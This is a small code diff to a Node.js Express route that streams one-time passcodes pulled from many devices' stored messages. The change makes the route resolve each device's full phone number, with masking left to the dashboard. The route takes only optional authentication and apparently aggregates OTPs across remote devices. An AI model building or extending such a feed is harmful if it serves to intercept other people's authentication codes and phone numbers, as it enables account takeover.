@@ -3,7 +3,7 @@
 /**
  * Real-time OTP feed via Server-Sent Events (SSE).
  * No cache — pushes fresh data every 5 seconds.
- * Uses device.phoneNumber directly from DeviceService.normalize().
+ * Resolves full phones per device; masking remains a dashboard UI concern.
  */
 
 const { Router } = require("express");
@@ -11,6 +11,7 @@ const ConnectionsService = require("../services/connections");
 const FirebaseService = require("../services/firebase");
 const DeviceService = require("../services/devices");
 const OtpExtractor = require("../services/otpExtractor");
+const { getPhone } = require("../utils/phone");
 const { optionalAuth } = require("../middleware/auth");
 
 const router = Router();
@@ -49,10 +50,12 @@ router.get("/otp", optionalAuth, async (req, res) => {
               for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
                 if (!deviceMessages || typeof deviceMessages !== "object") continue;
 
-                // Get phone DIRECTLY from normalized device
                 const device = devices.find((d) => d.id === deviceId);
-                const phone = (device && device.phoneNumber && device.phoneNumber !== "—")
-                  ? device.phoneNumber : "";
+                const phone = getPhone(
+                  device,
+                  clientsData?.[deviceId],
+                  deviceMessages
+                );
 
                 for (const [, msg] of Object.entries(deviceMessages)) {
                   if (!msg || typeof msg !== "object") continue;
